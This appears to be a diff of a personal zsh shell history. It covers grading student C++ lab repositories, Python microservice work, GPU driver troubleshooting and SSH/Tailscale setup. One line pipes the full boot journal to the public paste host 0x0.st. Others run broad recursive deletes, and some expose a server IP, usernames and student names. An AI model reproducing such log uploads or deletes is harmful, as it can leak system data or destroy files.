-cd -
-cd /home/rad1an/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count\
-
-git status
-git add ..
-git status
-git add .
-git commit -m "Add a basic words_count test"
-git push
-ду�
-ls
-git status
-v test_words.py
-python to_bin.py test2.zip | wl-copy
-python test_words.py serial
-cp test_words.py ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/
-cd ..
-ls
-git clone --recursive git@github.com:ucu-cs/lab7-words-count-unicode-sahaidak_muryn.git
-cd lab7-words-count-unicode-sahaidak_muryn
-ls
-cp ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
-python test_words.py serial
-v CMakeLists.txt
-ls
-ls bin
-cp bin/countwords_seq cmake-build-tests
-python test_words.py serial
-v test_words.py
-v src/main.cpp
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-v CMakeLists.txt
-j cpp-
-v CMakeLists.txt
-python test_words.py serial
-cp cmake-build-tests/compile_commands.json .
-v src/main.cpp
-python test_words.py serial -p
-v cfg.cfg
-./cmake-build-tests/countwords_seq cfg.cfg
-v cfg.cfg
-./cmake-build-tests/countwords_seq cfg.cfg
-./cmake-build-tests/countwords_seq cfg.cfg
-./cmake-build-tests/countwords_seq cfg.cfg
-./cmake-build-tests/countwords_seq cfg.cfg
-cd cmake-build-tests
-cmake --build .
-./countwords_seq ../cfg.cfg
-cd ..
-\rm -rf lab7-words-count-unicode-sahaidak_muryn
-ls
-cd ..
-cd ~/Downloads
-cd ..
-git clone git@github.com:ucu-cs/lab7-words-count-unicode-ilnytskyi_shumskyi_pelcharskyi.git
-cd lab7-words-count-unicode-ilnytskyi_shumskyi_pelcharskyi
-ls
-cp ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
-python test_words.py serial
-v countwords_seq.cpp
-python test_words.py serial
-cd ..
-\rm -r lab7-words-count-unicode-ilnytskyi_shumskyi_pelcharskyi
-\rm -fr lab7-words-count-unicode-ilnytskyi_shumskyi_pelcharskyi
-j lab7
-j lab7
-cp ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
-python test_words.py serial
-v txt.nottxt
-v txt.nottxt
-python to_bin.py test2.zip | wl-copy
-v test_words.py
-j lab7
-cp ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
-python test_words.py serial
-cp ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial -p
-cp ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
-python test_words.py serial -p
-св ду�и7
-cd lab7-words-count-unicode-kokhan_mozil_savorona
-cd lab7-words-count-unicode-kokhan_mozil_savorona
-j lab7
-j lab7
-cp ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
-python test_words.py serial
-v test_words.py
-git diff
-git status
-v test_words.py
-python test_words.py serial -p
-v cfg.cfg
-python test_words.py serial
-./cmake-build-tests/countwords_seq ./cfg.cfg
-ls
-cat a
-cat n
-v src/files_reader.cpp
-cd cmake-build-tests
-cmake --build .
-./countwords_seq ../cfg.cfg
-cmake --build .
-./countwords_seq ../cfg.cfg
-cd __
-cd ../__
-cd ../__tests__
-ls
-cd test_num_1
-ls
-\rm -r *
-ls
-cd ../..
-python test_words.py serial -p
-ranger __tests__
-./countwords_seq ../cfg.cfg
-ranger __tests__
-cmake --build .
-./countwords_seq ../cfg.cfg
-cmake --build .
-ranger __tests__
-./countwords_seq ../cfg.cfg
-cmake --build .
-./countwords_seq ../cfg.cfg
-cmake --build .
-./countwords_seq ../cfg.cfg
-python to_bin.py test1.zip | wl-copy
-v test_words.py
-cp ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
-cd ..
-python test_words.py serial
-\rm -r __tests__
-python test_words.py serial -p
-cd -
-./countwords_seq ../cfg.cfg
-cp ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
-python test_words.py serial
-v test_words.py
-python to_bin.py test1.zip | wl-copy
-cp ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
-python test_words.py serial
-python to_bin.py test1.zip | wl-copy
-cp ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
-python to_bin.py test1.zip | wl-copy
-python test_words.py serial
-python to_bin.py test2tmp.zip | wl-copy
-cp ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
-ls
-cp ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
-python test_words.py serial
-python to_bin.py test2.zip | wl-copy
-cp ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
-python test_words.py serial
-cp ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
-python test_words.py serial
-python test_words.py serial
-git status
-git add .
-git commit -m "Add a second test to words count"
-git push
-j acs ass
-ls
-python randomize.py integral_teams.txt
-ls UCU_autotests
-ls ge
-ls UCU_autotests/general
-cp randomize.py UCU_autotests/general
-cd UCU_autotests/general
-ls
-python randomize.py
-python randomize.py -h
-v randomize.py
-\rm ../../randomize.py
-git add .
-git commit -m "Add a script to select a random person from each team"
-git push
-j acs ass
-ls
-v integral_teams.txt
-cp integral_teams.txt 1brc_teams.txt
-v 1brc_teams.txt
-cd UCU_autotests/general
-python randomize.py ../../1brc_teams.txt
-j sec
-ls
-cd lab1
-ls
-o .
-git clone git@github.com:ucu-cs/lab6-1brc-stetsiuk_chupa_dizhak_.git
-cd lab6-1brc-stetsiuk_chupa_dizhak_
-codium .
-\rm -r lab6-1brc-stetsiuk_chupa_dizhak_
-\rm -fr lab6-1brc-stetsiuk_chupa_dizhak_
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-yay --noconfirm
-yay --noconfirm
-git clone git@github.com:ucu-cs/lab5-threadpool-integral-koval_sirska_.git
-cd lab5-threadpool-integral-koval_sirska_
-cp ~/Templates/cpp_template/cmake ~/Templates/cpp_template/project.Dockerfile ~/Templates/cpp_template/compile.sh . -r
-cppbuild lab5tmp
-cppcompile lab5tmp -p
-v CMakeLists.txt
-git clone git@github.com:ucu-cs/lab5-threadpool-integral-stetsiuk_chupa_dizhak.git
-cd lab5-threadpool-integral-stetsiuk_chupa_dizhak
-v main.cpp
-cd ..
-\rm -r lab5*
-\rm -fr lab5*
-ls
-nvidia-s
-nvidia-smi
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-yay --noconfirm
-nvidia-smi
-reboot
-nvidia-smi
-git init
-git add .
-git commit -m "Add lab3"
-git push --set-upstream git@github.com:rhusiev-student/s6_uv_lab3.git
-git push --set-upstream git@github.com:rhusiev-student/s6_uv_lab3.git main
-nvidia-smi
-powertop
-sudo powertop
-sudo powertop
-sudo powertop -h
-sudo powertop --auto-tune
-j apz
-j ucu
-cd apz
-ls
-cat setup.sh
-ranger lab3
-ranger lab3
-cd lab3
-ls
-cd facade
-ls
-cd ..
-cd ..
-cp lab3 lab4 -r
-cd lab4
-ls
-\rm -fr **/target/
-ls
-ranger
-ls config
-v messages/src/main.rs
-cd messages
-ls
-\rm -r *
-ls
-la
-ls ../logging
-mkdir src
-v src/main.py
-ranger
-cd ..
-python -m venv venv
-\rm -r venv
-cd ..
-python -m venv venv
-source venv/bin/activate
-\rm -r venv
-da
-cd -
-ls
-cd messages
-ls
-poetry init
-poetry add fastapi
-poetry add uvicorn
-ls
-ls src
-zshrc
-eval $(poetry env activate)
-python src/main.py
-poetry add requests
-python src/main.py
-j apz
-ls
-cd lab4
-ls
-j lab4
-j lab4
-\rm -fr .git
-git init
-git add .
-git commit -m "Move messages to python"
-git push --set-upstream git@github.com:rhusiev-student/s6_apz_lab4.git micro_mq
-git push --set-upstream git@github.com:rhusiev-student/s6_apz_lab4.git micro_mq
-git checkout -b micro_mq
-git push --set-upstream git@github.com:rhusiev-student/s6_apz_lab4.git micro_mq
-git push --set-upstream git@github.com:rhusiev-student/s6_apz_lab4.git micro_mq
-git status
-ls
-cd facade
-ls
-ls
-cd logging
-ls
-cd config
-ls
-eval $(poetry env activate)
-ls
-eval $(poetry env activate)
-python src/config.py --new
-poetry list
-poetry env list
-pip list
-poetry install
-poetry install
-ls
-touch README.md
-touch README.md
-poetry install
-poetry install
-ls
-mv src logging
-ls
-mv logging src
-ls
-ls src
-ls logs
-ls src
-mv src/main.py src/logging.py
-poetry install
-python src/config.py --new
-python src/logging.py 0
-mv src/logging.py src/main.py
-python src/main.py 0
-cargo run http://127.0.0.1:8000 127.0.0.1
-python src/main.py
-cargo run http://127.0.0.1:8000
-python src/main.py http://127.0.0.1:8000 127.0.0.1
-v src/main.py
-curl -i --styled-output -X POST "localhost:13226?message=msg10"
-curl -i --styled-output -X POST "localhost:13226?message=msg01"
-curl -i --styled-output -X GET "localhost:13226"
-j lab4
-git status
-git add .
-git commit -m "Add empty readmes"
-git push
-podman ps -a
-podman ps -a
-v src/main.rs
-v src/main.py
-poetry show
-v src/main.py
-la
-la
-\rm -r *
-poetry init
-poetry add requests fastapi uvicorn
-poetry show
-poetry add grpcio grpcio-tools protobuf
-v pyproject.toml
-v pyproject.toml
-v pyproject.toml
-v pyproject.toml
-poetry add grpcio@^1.70.0 grpcio-tools@^1.70.0
-v pyproject.toml
-poetry show
-ls
-python src/config.py --new
-python src/main.py http://127.0.0.1:8000 127.0.0.1
-python src/main.py 0
-mkdir src
-v src/main.py
-python src/main.py http://127.0.0.1:8000
-eval $(poetry env activate)
-python src/main.py http://127.0.0.1:8000
-ls ..
-poetry run python -m grpc_tools.protoc -I. --python_out=src/grpc_generated --grpc_python_out=src/grpc_generated --proto_path=.. ../logging.proto
-mkdir src/grpc_generated
-poetry run python -m grpc_tools.protoc -I. --python_out=src/grpc_generated --grpc_python_out=src/grpc_generated --proto_path=.. ../logging.proto
-v src/main.py
-v src/main.py
-python src/main.py http://127.0.0.1:8000
-ls
-ls src/grpc_generated
-touch src/grpc_generated/__init__.py
-python src/main.py http://127.0.0.1:8000
-ls src/grpc_generated
-v pyproject.toml
-poetry install
-touch README.md
-poetry install
-python src/main.py http://127.0.0.1:8000
-v src/grpc_generated/logging_pb2_grpc.py
-v src/grpc_generated/logging_pb2_grpc.py
-python src/main.py http://127.0.0.1:8000
-curl -i --styled-output -X GET "localhost:13226"
-curl -i --styled-output -X POST "localhost:13226?message=msg01"
-curl -i --styled-output -X POST "localhost:13226?message=msg10"
-curl -i --styled-output -X GET "localhost:13226"
-curl -i --styled-output -X POST "localhost:13226?message=mse"
-curl -i --styled-output -X GET "localhost:13226"
-curl -i --styled-output -X GET "localhost:13226"
-curl -i --styled-output -X GET "localhost:13226"
-curl -i --styled-output -X GET "localhost:13226"
-curl -i --styled-output -X GET "localhost:13226"
-curl -i --styled-output -X GET "localhost:13226"
-curl -i --styled-output -X GET "localhost:13226"
-curl -i --styled-output -X GET "localhost:13226"
-curl -i --styled-output -X GET "localhost:13226"
-curl -i --styled-output -X GET "localhost:13226"
-ls
-v src/main.py
-v src/main.py
-python src/main.py http://127.0.0.1:8000
-poetry add httpx
-poetry remove requests
-python src/main.py http://127.0.0.1:8000
-curl -i --styled-output -X GET "localhost:13226"
-curl -i --styled-output -X POST "localhost:13226?message=msf"
-curl -i --styled-output -X POST "localhost:13226?message=ms1"
-curl -i --styled-output -X GET "localhost:13226"
-curl -i --styled-output -X GET "localhost:13226"
-python src/main.py 0
-curl -i --styled-output -X GET "localhost:13226"
-python src/main.py 0
-v src/main.py
-python src/main.py http://127.0.0.1:8000
-eval $(poetry env activate)
-python src/main.py http://127.0.0.1:8000
-curl -i --styled-output -X GET "localhost:13226"
-curl -i --styled-output -X POST "localhost:13226?message=ms2"
-curl -i --styled-output -X GET "localhost:13226"
-python src/main.py 0
-curl -i --styled-output -X GET "localhost:13226"
-python src/main.py 0
-python src/main.py http://127.0.0.1:8000
-curl -i --styled-output -X GET "localhost:13226"
-python src/main.py 0
-podman ps -a
-podman ps -a
-podman rm -a
-podman stop -a
-podman rm -a
-git add ..
-git commit -m "Move all to python"
-git push
-v src/main.py
-v src/main.py
-python src/config.py --new
-python src/main.py 0
-python src/main.py http://127.0.0.1:8000 127.0.0.1
-python src/main.py http://127.0.0.1:8000
-eval $(poetry env activate)
-python src/main.py http://127.0.0.1:8000
-v src/main.py
-v src/main.py
-python src/main.py http://127.0.0.1:8000
-curl -i --styled-output -X GET "localhost:13226"
-curl -i --styled-output -X POST "localhost:13226?message=ms2"
-curl -i --styled-output -X GET "localhost:13226"
-curl -i --styled-output -X POST "localhost:13226?message=ms1"
-python src/main.py 0
-curl -i --styled-output -X POST "localhost:13226?message=ms1"
-python src/main.py 0
-curl -i --styled-output -X POST "localhost:13226?message=ms1"
-podman ps -a
-python src/main.py 0
-curl -i --styled-output -X POST "localhost:13226?message=ms1"
-curl -i --styled-output -X POST "localhost:13226?message=ms1"
-curl -i --styled-output -X POST "localhost:13226?message=ms1"
-python src/main.py 0
-curl -i --styled-output -X POST "localhost:13226?message=ms1"
-curl -i --styled-output -X POST "localhost:13226?message=ms1"
-curl -i --styled-output -X POST "localhost:13226?message=ms1"
-curl -i --styled-output -X POST "localhost:13226?message=ms1"
-curl -i --styled-output -X GET "localhost:13226"
-v src/config.py
-v src/main.py
-git add ..
-git commit -m "Simplify python files"
-v src/main.py
-v src/config.py
-v src/main.py
-v src/main.py
-git add ..
-git commit --amend
-git push
-v ../README.md
-\rm -r ../img
-ls
-ls ..
-git add ..
-git commit -m "Remove the old readme and images"
-git commit --amend
-git push
-podman ps -a
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-yay --noconfirm
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-yay --noconfirm
-nvidia-smi
-nvidia-smi
-yay nvidia
-killall nextcloud
-nvidia-smi
-lspci -k | grep -EA3 'VGA|3D' 
-nvidia-smi
-sudo journalctl -b | curl -F 'file=@-' 0x0.st
-sudo journalctl -b
-zshrc
-yay fzf
-zshrc
-sudoedit /etc/kernel/cmdline
-sudo dracut
-sudo dracut --force
-sudo dracut --all
-sudo dracut --ah
-uname
-uname -u
-uname -a
-sudo pacman -Q nvidia
-sudo pacman -Q kernel
-sudo pacman -Q linux
-sudo dracut 6.13.8 --force
-ls
-la
-sudo ls /efi
-sudo ls /efi/9852361fabc94a829aa95cf2b0f29a55
-sudo dracut /efi/9852361fabc94a829aa95cf2b0f29a55/6.13.8-arch1-1 --force
-nvidia-smi
-vkcube
-sudoedit /etc/kernel/cmdline
-sudo dracut /efi/9852361fabc94a829aa95cf2b0f29a55/6.13.8-arch1-1 --force
-sudo dracut
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-yay --noconfirm
-yay -Qs nvidia
-yay -Rns "*nvidia*"
-yay -Rns "nvidia"
-nvidia-inst
-sudo nvidia-inst
-nvidia-inst
-nvidia-inst -n
-yay -Rns nvidia nvidia-utils nvidia-settings lib32-nvidia-libgl
-yay -Rns nvidia nvidia-utils
-yay -Rns nvidia nvidia-utils nvidia-lts lib32-nvidia-utils steam
-sudoedit /etc/kernel/cmdline
-nvidia-inst -t
-nvidia-inst -h
-nvidia-inst -t
-nvidia-inst -n
-nvidia-inst --drivers
-inxi -Faz
-cd /run/media/rad1an/Ventoy/
-ls
-cat EndeavourOS_Mercury-Neo-2025.03.19.iso.sha512sum
-sha512sum EndeavourOS.iso
-\rm EndeavourOS.iso
-o .
-;s
-ls
-la
-\rm .zshenv .bash*
-ls
-la
-v .profile
-\rm .profile
-la
-p11-kit 
-ls
-v .local/share/zsh/p10k.zsh
-j
-cd dotfiles
-git diff
-j local/share/zsh
-git diff
-git diff .
-git status .
-v .giti
-v ../.gitignore
-p10k
-ls
-echo 'source ~/.local/share/zsh/powerlevel10k/powerlevel10k.zsh-theme'
-zshrc
-echo $XDG_DATA_HOME
-zshrc
-source $XDG_DATA_HOME/zsh/powerlevel10k/powerlevel10k.zsh-theme
-
-p11-kit 
-ls
-v .local/share/zsh/p10k.zsh
-j
-cd dotfiles
-git diff
-j local/share/zsh
-git diff
-git diff .
-git status .
-v .giti
-v ../.gitignore
-p10k
-ls
-echo 'source ~/.local/share/zsh/powerlevel10k/powerlevel10k.zsh-theme'
-zshrc
-echo $XDG_DATA_HOME
-zshrc
-source $XDG_DATA_HOME/zsh/powerlevel10k/powerlevel10k.zsh-theme
-zshrc
-zshrc
-flatpak --system install zen
-j scripts
-cd dotfiles
-cd scripts
-ls
-v install_fedora.sh
-j pri
-cd .ssh
-cd Servers/
-cd privex
-ls
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-kdeconnectd
-kdeconnectd --replace
-d kdeconnectd --replace
-sudo chown rad1an:rad1an /drive /gamessd /vmdows /large
-nvidia-inst --drivers
-nvidia-smi
-vkcube
-novideo vkcube
-nvidia-smi
-nvidia-smi
-nvidia-smi
-vkcube
-nvidia-smi
-nvidia-smi
-zshrc
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-sudo dnf update -y
-sudoedit /etc/default/grub
-nvidia-smi
-nvidia-smi
-sudo dnf remove "*nvidia*"
-sudoedit /etc/default/grub
-zshrc
-update-grub
-rpm -qf /usr/share/zsh//5.1/functions/_dnf\
-
-sudo rpm -qf /usr/share/zsh//5.1/functions/_dnf\
-
-curl https://raw.githubusercontent.com/zsh-users/zsh/master/Completion/Redhat/Command/_dnf -o ~/.local/share/zsh/zfunc/_dnf
-curl https://raw.githubusercontent.com/zsh-users/zsh/master/Completion/Redhat/Command/_dnf5 -o ~/.local/share/zsh/zfunc/_dnf5
-_dnf
-j zsh
-ls
-ls zfunc
-v
-j config
-j ~/.config
-cd zsh
-v
-echo $PATH
-j zsh
-j zsh
-ls
-v custom_installs.zsh
-echo $XDG_CONFIG_HOME
-echo $fpath
-_dnf
-echo $fpath
-j zsh
-v zfunc/_dnf
-_dnf
-_dnf
-_dnf
-\rm .config/zsh/.zcompdump
-j pri
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-j scri
-ls
-v install_arch.sh
-convim
-convim
-convim
-convim
-v temp/py.py
-v temp/py.py
-convim
-convim
-convim
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-cd temp
-poetry init
-la
-v pyproject.toml
-cd -
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-v temp/py.py
-j nvim
-j share
-cd .local
-cd share
-cd nvim
-cd lazy
-v inlay-hint.nvim/lua/inlay-hint/init.lua
-v inlay-hint.nvim/lua/inlay-hint/init.lua
-v inlay-hint.nvim/lua/inlay-hint/init.lua
-v temp/py.py
-convim
-convim
-v temp/py.py
-v temp/py.py
-convim
-nvidia-smi
-vkcube
-novideo vkcube
-lspci -k | grep -EA3 'VGA|3D' 
-vkcube
-sudo dnf install mesa
-sudo dnf install @mesa
-sudo dnf install mesa-dri
-vkcube
-killall vkcube
-sudoedit /etc/default/grub
-update-grub
-lspci -k | grep -EA3 'VGA|3D' 
-vkcube
-sudoedit /etc/kernel/cmdline
-shai list kernek modules
-v .config/.gitignore
-mkdir .config/shell-ai
-v .config/shell-ai/config.json
-convim
-shai list kernel modules
-lsmod | grep nv
-lsmod | grep nou
-lsmod | grep nou
-lsmod | grep nou
-lspci -k | grep -EA3 'VGA|3D' 
-lspci -k | grep -EA3 'VGA|3D' 
-vkcube
-sudoedit /etc/default/grub
-update-grub
-lspci -k | grep -EA3 'VGA|3D' 
-vkcube
-glxgears
-novideo glxgears
-nvidia-smi
-lspci | grep -i nvidia
-dmesg | grep -i nvidia\
-dmesg | grep -i nouveau\
-dmesg | grep -i gpu
-sudo -i
-cat /var/log/Xorg.0.log | grep -i nvidia\
-cat /var/log/Xorg.0.log | grep -i nouveau\
-cat /var/log/Xorg.0.log | grep EE
-glxinfo | grep "OpenGL renderer"
-sudo dnf install linux-firmware
-rpm -qa | grep nvidia
-mokutil --sb-state
-uname -r
-gpustat
-sudo dnf install gpustat
-sudo dnf install python3-gpustat
-sudo dnf install python-gpustat
-pipx install gpustat
-gpustat
-gpustat --debug
-nvtop
-nvtop
-nvtop
-lspci | grep -i nvidia
-nvtop
-lspci | grep -i nvidia
-gpustat --debug
-pipx uninstall gpustat
-sudo dnf uninstall nvtop
-sudo dnf remove nvtop
-sudoedit /etc/default/grub
-update-grub
-j UCU_
-j acs
-j ucu
-cd D
-cd /drive
-cd Projects
-cd ucu
-cd a
-cd acs
-cd assistance
-ls
-cd UCU_autotests
-git pull
-cd acs
-cd 1brc
-pwd | wl-copy
-cp /drive/Projects/ucu/acs/assistance/UCU_autotests/acs/1brc/test_1brc.py .
-flatpak override --env=SIGNAL_PASSWORD_STORE=kwallet6 org.signal.Signal
-diff test_words.py /drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py
-v test_words.py
-cp test_words.py ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/
-j UCU
-git diff
-git add .
-git commit -m "Add forgotten md to tests of word counts"
-git push
-j UCU
-cd 1brc
-cd acs/1brc
-v test_words.py
-cd..
-..
-cd ..
-cd words_count
-ls
-v test_words.py
-ls
-ls
-v CMakeLists.txt
-cp ~/Templates/cpp_template/cmake ~/Templates/cpp_template/project.Dockerfile ~/Templates/cpp_template/compile.sh . -r
-cppbuild lab6test
-cppbuild lab6check
-podman image list
-cppcompile lab6check -p
-sudo dnf reinstall container-selinux
-restorecon -R -v $HOME
-cppcompile lab6check -p
-restorecon -R -v $HOME/.local/share/containers
-cppcompile lab6check -p
-cppbuild lab6check
-cppcompile lab6check -p
-podman system reset
-cppbuild lab6check
-cppcompile lab6check -p
-sudo dnf reinstall container-selinux
-restorecon -RFv $HOME/.local/share/containers
-podman system reset
-restorecon -RFv $HOME/.local/share/containers
-cppbuild lab6check
-cppcompile lab6check -p
-podman info | grep graphRoot
-semanage fcontext -a -e /var/lib/containers /home/rad1an/dotfiles/local/share/containers/storage
-sudo semanage fcontext -a -e /var/lib/containers /home/rad1an/dotfiles/local/share/containers/storage
-sudo restorecon -R -v /home/rad1an/dotfiles/local/share/containers/storage
-podman system reset
-cppcompile lab6check -p
-v CMakeLists.txt
-cppcompile lab6check -p
-v CMakeLists.txt
-v CMakeLists.txt
-cppcompile lab6check -p
-git diff
-git status
-v CMakeLists.txt
-cppcompile lab6check -p
-v src/brc.cpp
-cpprun lab6check test_1brc.py
-zshrc
-source /home/rad1an/dotfiles/config/zsh/aliases.zsh
-cpprun lab6check test_1brc.py
-v project.Dockerfile
-source /home/rad1an/dotfiles/config/zsh/aliases.zsh
-cpprun lab6check test_1brc.py
-cpprun lab6check python test_1brc.py
-ls
-v src/brc.cpp
-v CMakeLists.txt
-v src/main_brc.cpp
-v src/brc.
-v src/brc.cpp
-v src/utils/time_measure.h
-python test_1brc.py
-cpprun lab6check python test_1brc.py
-v src
-v test_1brc.py
-v 1.py
-diff 1.py test_1brc.py
-\rm 1.py
-v CMakeLists.txt
-j words
-j words
-j acs
-j acs
-ls
-cd lab7-words-kovalchuk_husiev_zaletskyi
-v CMakeLists.txt
-v src/main_brc.cpp
-v src/main_brc.cpp
-ls
-diff test.py test_1brc.py
-v readme.md
-python runner.py -h
-v runner.py
-v configs/1_b_data.cfg
-v runner.py
-v configs/1_b_data.cfg
-v runner.py
-v readme.md
-v runner.py
-sudo python runner.py
-sudo python runner.py 3 false
-sudo python runner.py 3 0
-ls configs/
-v test.py
-v configs/measurements-1.cfg
-v configs/1_b_data.cfg
-sudo python runner.py 
-sudo python runner.py 3 0
-v runner.py
-sudo python runner.py 3 0
-ls
-./bin/1brc configs/1_b_data.cfg
-./bin/1brc
-v src/main_brc.cpp
-j newse
-j proj
-ls
-cd Personal
-ls
-cd newsense
-ls
-j apz
-j ucu
-j ucu
-cd apz
-ls
-j proj
-cd ucu
-cd cpp
-ls
-git clone git@github.com:rhusiev/GIMMICK.git
-cd GIMMICK
-cppproj
-ls
-v CMakeLists.txt
-git add .
-git commit -m "Initial commit"
-git push
-mkdir py_scripts
-sudo dnf install tailscale
-v dotfiles/scripts/install_arch.sh
-v dotfiles/scripts/install_fedora.sh
-sudo systemctl enable --now tailscaled
-sudo tailscale up
-tailscale ip -4
-ping 100.86.205.106
-sudo tailscale down
-ip a
-sudo tailscale down
-ip a
-if link set dev tailscale0 down
-ip link set dev tailscale0 down
-sudo ip link set dev tailscale0 down
-ip a
-sudo ip link set dev tailscale0 up
-ip a
-sudo systemctl stop tailscaled
-ip a
-ping duck.com
-ping duck.com
-ping duck.com
-ping duck.com
-sudo systemctl start tailscale
-sudo systemctl start tailscaled
-ping duck.com
-ping 100.86.205.106
-sudo tailscale up
-ping duck.com
-ping 100.86.205.106
-ssh -A gimmick@100.86.205.106
-eval $(ssh-agent)
-ssh-add .ssh/id_ed25519
-ssh -A gimmick@100.86.205.106
-ls
-ssh -A gimmick@100.86.205.106
-v .ssh/config
-ssh -A gimmick@100.86.205.106
-ssh -A gimmick@100.86.205.106
-ping 100.111.148.78
-ssh -A gimmick@100.86.205.106
-ssh -A gimmick@100.86.205.106
-ping 100.111.148.78
-ping 100.111.148.78
-ping 100.111.148.78
-ping 100.111.148.78
-sudo tailscale up
-ping 100.111.148.78
-sudo tailscale up
-sudo tailscale down
-sudo tailscale up
-ping 100.111.148.78
-ssh -A gimmick@100.86.205.106
-ssh -A gimmick@100.86.205.106
-ssh -A gimmick@100.86.205.106
-ping 100.111.148.78
-ssh -A gimmick@100.86.205.106
-ssh -A gimmick@100.86.205.106
-ping 100.111.148.78
-ssh -A gimmick@100.86.205.106
-ssh -A gimmick@100.86.205.106
-ping 100.111.148.78
-ping 100.111.148.78
-ssh -A gimmick@100.86.205.106
-j GIMMICK
-ls
-ls src
-v src/dOOM_gen.cpp
-mv src/dOOM_gen.cpp src/chunk_dOOm_gen.cpp
-v src/chunk_dOOm_gen.cpp
-git add .
-git commit -m "Add a very initial structure"
-git push
-git pull --rebase
-glog
-git push
-v src/chunk_dOOm_gen.cpp
-./compile.sh -d
-v src/main.cpp
-./compile.sh -d
-cppslp
-cpplsp
-v src/chunk_dOOm_gen.cpp
-ls
-ls -r libraries
-ls -R libraries
-./compile.sh -d
-cpplsp
 v src/chunk_dOOm_gen.cpp
 ./compile.sh -d
 ./compile.sh -d
@@ -5012,13 +1866,3280 @@ git push
 update
 flatpak --user update -y && flatpak update -y && tldr --update
 sudo dnf update -y
-: 1744979041:0;j cpp
-: 1744979043:0;ls
-: 1744979059:0;git clone git@github.com:ucu-cs/lab3-my-vector-opyr_zaletskyi_husiev.git
-: 1744979065:0;cd lab3-my-vector-opyr_zaletskyi_husiev
-: 1744979080:0;\rm -r *
-: 1744979083:0;la
-: 1744979093:0;\rm .github -r
-: 1744979098:0;cppproj
-: 1744979440:0;ls
-: 1744979505:0;v include/vector_the_serene.hpp
+j cpp
+ls
+git clone git@github.com:ucu-cs/lab3-my-vector-opyr_zaletskyi_husiev.git
+cd lab3-my-vector-opyr_zaletskyi_husiev
+\rm -r *
+la
+\rm .github -r
+cppproj
+ls
+v include/vector_the_serene.hpp
+j cpp
+ls
+cd lab1-ratio-zaletskyi_husiev
+ls
+v sri
+v include/QTheStubborn.hpp
+./compile.sh -d
+./compile.sh -d
+./bin/executable_name
+cpplsp
+./compile.sh -d
+\rm bin/executable_name
+\rm bin/executable_name
+./compile.sh -d
+./compile.sh -d
+./bin/test_vector
+j scri
+ls
+qalc
+v dotfiles/scripts/install_fedora.sh
+j lab3
+j cpp
+ls
+cd lab3-my-vector-opyr_zaletskyi_husiev
+ls
+v src/main.cpp
+git add .
+git commit -m "Add the backbone of a vector"
+v re
+ls
+git push
+sudo dnf remove tbb-devel
+v dotfiles/scripts/install_fedora.sh
+sudo dnf remove libarchive-devel
+cd Dow
+cd Downloads
+cd lab8-words-count-parallel-stasyshyn_basystyi_
+ls
+cp ~/Templates/cpp_template/cmake ~/Templates/cpp_template/project.Dockerfile ~/Templates/cpp_template/compile.sh . -r
+git diss
+git diff
+ls
+./compile.sh -d
+o .
+v project.Dockerfile
+cppbuild lab8check
+cppcompile lab8check -d
+cppcompile lab8check -c
+cppcompile lab8check -d
+ls
+ls cin
+ls bin
+cppcompile lab8check -p
+v src/ts_queue.hpp
+ls
+fd conf
+fd cfg
+v analysis.md
+v tmp.cfg
+lsblk
+ls /run/media/rad1an/CDROM
+ranger /run/media/rad1an/CDROM
+ls /run/media/rad1an/CDROM/7
+cppcompile lab8check --s="tmp.cfg"
+ls
+cp  /run/media/rad1an/CDROM/7/3 ./3 -r
+v tmp.cfg
+cppcompile lab8check --s="tmp.cfg"
+v project.Dockerfile
+v compile.sh
+v CMakeLists.txt
+cppcompile lab8check --s="tmp.cfg"
+v tmp.cfg
+cppcompile lab8check --s="tmp.cfg"
+v tmp.cfg
+cppcompile lab8check --s="tmp.cfg"
+ls
+ls test
+ls testing_dirs
+v src/main.cpp
+cp /drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
+cpprun lab8check ./build/countwords_par tmp.cfg
+cpprun lab8check ./bin/countwords_par tmp.cfg
+cpprun lab8check python test_words.py
+cpprun lab8check python test_words.py parallel -C -s
+cpprun lab8check python test_words.py parallel -C -s
+v test_words.py
+v test_words.py
+v test_words.py
+ls
+ls scripts
+o .
+o .
+ls
+ls scripts
+v scripts/count_words.py
+v scripts/words_runner.py
+python scripts/words_runner.py
+python -m venv venv
+source venv/bin/activate
